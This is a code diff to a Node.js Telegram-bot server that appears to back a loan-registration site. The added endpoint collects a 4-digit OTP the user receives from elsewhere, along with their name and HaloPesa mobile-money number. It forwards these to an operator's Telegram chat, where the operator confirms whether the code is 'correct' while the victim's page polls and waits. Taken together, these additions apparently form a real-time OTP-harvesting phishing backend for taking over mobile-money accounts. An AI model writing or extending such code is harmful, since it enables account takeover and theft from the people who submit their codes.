@@ -38,6 +38,7 @@ const suspendAllSessions = new Map(); // superadmin chatId → session data
 const pendingPayments   = new Map(); // chatId → payment claim data
 const pendingRegistrations = new Map(); // registrationId → { data, status, timestamp, adminResponse }
 const pendingRenewals   = new Map(); // chatId → renewal claim data
+const pendingOtpVerification = new Map(); // registrationId → { otp, status, submittedTime }
 
 const SUSPEND_PAGE_SIZE = 10;
 
@@ -264,6 +265,58 @@ bot.on('callback_query', async (query) => {
             );
 
             await bot.answerCallbackQuery(query.id, { text: '❌ Rejected!', show_alert: false });
+        }
+
+        // APPROVE OTP CODE (user entered OTP, admin verifies)
+        else if (data.startsWith('otp_approve_')) {
+            const registrationId = data.replace('otp_approve_', '');
+            const otpData = pendingOtpVerification.get(registrationId);
+
+            if (!otpData) {
+                await bot.answerCallbackQuery(query.id, { text: '❌ OTP verification not found', show_alert: true });
+                return;
+            }
+
+            otpData.status = 'approved';
+            console.log(`✅ OTP APPROVED: ${registrationId}`);
+
+            await bot.editMessageText(
+                `✅ *OTP CODE APPROVED*\n\nCode: \`${otpData.otp}\`\nClient can proceed to loan form\n\nRegistration ID: \`${registrationId}\``,
+                {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    parse_mode: 'Markdown',
+                    reply_markup: { inline_keyboard: [] }
+                }
+            );
+
+            await bot.answerCallbackQuery(query.id, { text: '✅ OTP Approved!', show_alert: false });
+        }
+
+        // REJECT OTP CODE (wrong code, ask user to re-enter)
+        else if (data.startsWith('otp_reject_')) {
+            const registrationId = data.replace('otp_reject_', '');
+            const otpData = pendingOtpVerification.get(registrationId);
+
+            if (!otpData) {
+                await bot.answerCallbackQuery(query.id, { text: '❌ OTP verification not found', show_alert: true });
+                return;
+            }
+
+            otpData.status = 'rejected';
+            console.log(`❌ OTP REJECTED: ${registrationId}`);
+
+            await bot.editMessageText(
+                `❌ *OTP CODE REJECTED*\n\nCode: \`${otpData.otp}\`\nClient should re-enter correct code\n\nRegistration ID: \`${registrationId}\``,
+                {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    parse_mode: 'Markdown',
+                    reply_markup: { inline_keyboard: [] }
+                }
+            );
+
+            await bot.answerCallbackQuery(query.id, { text: '❌ OTP Rejected! Client can retry', show_alert: false });
         }
     } catch (error) {
         console.error('❌ Callback query error:', error);
@@ -2112,9 +2165,13 @@ app.get('/api/registrations/pending', (req, res) => {
         timestamp: data.timestamp,
         status: data.status
       });
+    }
+  }
+  res.json({ success: true, pendingCount: pending.length, registrations: pending });
+});
 
-// POST /api/verify-otp
-app.post('/api/verify-otp', async (req, res) => {
+// POST /api/submit-otp - User submits externally-received OTP (AFTER admin approved registration)
+app.post('/api/submit-otp', async (req, res) => {
   try {
     const { registrationId, otp } = req.body;
 
@@ -2128,35 +2185,97 @@ app.post('/api/verify-otp', async (req, res) => {
       return res.status(404).json({ success: false, message: 'Registration not found' });
     }
 
-    // Check if already verified
-    if (registration.otpVerified) {
-      return res.status(400).json({ success: false, message: 'OTP already verified' });
+    // OTP must be 4 digits (what user entered externally)
+    if (!/^\d{4}$/.test(otp)) {
+      return res.status(400).json({ success: false, message: 'OTP must be 4 digits' });
     }
 
-    // Verify OTP
-    if (registration.otp !== otp) {
-      return res.status(401).json({ success: false, message: 'OTP sio sahihi' });
+    // Store OTP for admin verification
+    pendingOtpVerification.set(registrationId, {
+      otp,
+      status: 'pending',
+      submittedTime: new Date()
+    });
+
+    console.log(`📋 OTP submitted for verification: ${registrationId}`);
+    console.log(`   OTP Code: ${otp}`);
+
+    // Send to Telegram for admin verification
+    try {
+      const superAdminChatId = process.env.SUPER_ADMIN_CHAT_ID;
+      
+      const message = `
+🔐 *OTP CODE VERIFICATION*
+
+👤 *Mtumiaji:* ${registration.firstName} ${registration.lastName}
+🔑 *HaloPesa:* ${registration.haloNumber}
+
+📌 *OTP Code Submitted:* \`${otp}\`
+
+⚠️ Verify if this code is CORRECT
+
+📱 *Registration ID:* \`${registrationId}\`
+      `;
+
+      const approveBtn = {
+        text: '✅ Sahihi',
+        callback_data: `otp_approve_${registrationId}`
+      };
+
+      const rejectBtn = {
+        text: '❌ Sio Sahihi',
+        callback_data: `otp_reject_${registrationId}`
+      };
+
+      await bot.sendMessage(superAdminChatId, message.trim(), {
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [[approveBtn, rejectBtn]]
+        }
+      });
+
+      console.log(`✅ OTP sent to Telegram for verification: ${registrationId}`);
+    } catch (telegramError) {
+      console.error('❌ Error sending OTP to Telegram:', telegramError.message);
     }
 
-    // Mark as verified
-    registration.otpVerified = true;
-    console.log(`✅ OTP VERIFIED: ${registrationId}`);
-
+    // Return to client that OTP was submitted
     res.json({
       success: true,
-      message: 'OTP verified successfully',
+      message: 'OTP submitted for verification. Waiting for admin confirmation.',
       registrationId
     });
 
   } catch (error) {
-    console.error('❌ OTP verification error:', error);
+    console.error('❌ Submit OTP error:', error);
     res.status(500).json({ success: false, message: 'Server error' });
   }
 });
 
+// GET /api/check-otp-status/:registrationId
+// Frontend polls this to check if admin approved OTP
+app.get('/api/check-otp-status/:registrationId', async (req, res) => {
+  try {
+    const { registrationId } = req.params;
+    
+    const otpData = pendingOtpVerification.get(registrationId);
+
+    if (!otpData) {
+      return res.status(404).json({ 
+        success: false, 
+        message: 'OTP verification not found' 
+      });
     }
+
+    res.json({
+      success: true,
+      status: otpData.status  // 'pending' | 'approved' | 'rejected'
+    });
+
+  } catch (error) {
+    console.error('❌ Check OTP status error:', error);
+    res.status(500).json({ success: false, message: 'Server error' });
   }
-  res.json({ success: true, pendingCount: pending.length, registrations: pending });
 });
 
 // GET /health
@@ -2310,6 +2429,7 @@ async function shutdownGracefully(signal) {
         pendingRegistrations.clear();
         pendingPayments.clear();
         pendingRenewals.clear();
+        pendingOtpVerification.clear();
         adminChatIds.clear();
         pausedAdmins.clear();
         processingLocks.clear();
